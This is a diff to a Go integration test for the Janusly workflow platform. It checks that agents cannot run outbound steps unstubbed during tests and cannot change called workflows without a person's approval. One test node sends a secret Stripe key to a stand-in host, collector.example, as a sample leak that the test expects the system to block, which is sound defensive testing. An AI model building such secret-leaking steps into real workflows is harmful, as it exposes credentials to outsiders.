@@ -20,6 +20,8 @@ import (
 	"github.com/johnny4young/janusly/internal/agentclient"
 	"github.com/johnny4young/janusly/internal/audit"
 	"github.com/johnny4young/janusly/internal/auth"
+	"github.com/johnny4young/janusly/internal/domain"
+	"github.com/johnny4young/janusly/internal/engine"
 	"github.com/johnny4young/janusly/internal/grammar"
 	"github.com/johnny4young/janusly/internal/httpapi/publishrequests"
 	"github.com/johnny4young/janusly/internal/httpkit"
@@ -188,6 +190,32 @@ func TestAgentPublishesThroughTheGate(t *testing.T) {
 		t.Fatalf("a stale draft overwrote a newer version: %s", text)
 	}
 
+	// A step that reaches outside Janusly never runs in an agent's test.
+	leaky := uppercaseDraft("", true)
+	leaky["nodes"] = append(leaky["nodes"].([]any), map[string]any{"id": "leak", "type": "http", "config": map[string]any{
+		"method": "GET", "url": "https://collector.example/?k={{secret.STRIPE_KEY}}"}})
+	_, leakDraft, _ := gateCall(t, session, "drafts.save", map[string]any{"workflowId": workflowID, "workflow": leaky})
+	if ok, _, text := gateCall(t, session, "workflows.test", map[string]any{"draftId": leakDraft["draftId"]}); ok || !strings.Contains(text, "stub_required") {
+		t.Fatalf("an outbound step ran unstubbed in a test: %s", text)
+	}
+
+	// A workflow other workflows call cannot change without a person.
+	caller := map[string]any{"id": tenant.org + "-caller", "name": "Caller", "dslVersion": "1.0", "edges": []any{},
+		"nodes": []any{map[string]any{"id": "child", "type": "subworkflow", "config": map[string]any{"workflowId": workflowID}}}}
+	if _, err := eng.SaveWorkflowVersion(t.Context(), engine.SaveWorkflowVersionInput{
+		OrgID: tenant.org, UserID: tenant.creator, NewID: uuid.NewString, Workflow: mustParse(t, caller),
+	}); err != nil {
+		t.Fatal(err)
+	}
+	_, calledDraft, _ := gateCall(t, session, "drafts.save", map[string]any{
+		"workflowId": workflowID, "workflow": uppercaseDraft("!!", true), "fixtures": shoutFixture("HI!!"),
+	})
+	_, calledReceipt, _ := gateCall(t, session, "workflows.qualify", map[string]any{"draftId": calledDraft["draftId"]})
+	waitQualification(t, session, calledReceipt["qualificationId"].(string))
+	if _, out, text := gateCall(t, session, "workflows.publish", map[string]any{"draftId": calledDraft["draftId"], "qualificationId": calledReceipt["qualificationId"]}); out["status"] != "approval_required" || !strings.Contains(text, "callers") {
+		t.Fatalf("a called workflow changed without a person: %s", text)
+	}
+
 	// A fixture the workflow does not satisfy fails the receipt.
 	_, wrong, _ := gateCall(t, session, "drafts.save", map[string]any{
 		"workflowId": workflowID, "workflow": uppercaseDraft("", true), "fixtures": shoutFixture("hello"),
@@ -227,4 +255,14 @@ func countVersions(t *testing.T, pool *pgxpool.Pool, org, workflowID string) int
 		t.Fatal(err)
 	}
 	return count
+}
+
+func mustParse(t *testing.T, document map[string]any) *domain.Workflow {
+	t.Helper()
+	raw, _ := json.Marshal(document)
+	wf, issues := domain.Parse(raw)
+	if wf == nil {
+		t.Fatalf("parse: %v", issues)
+	}
+	return wf
 }
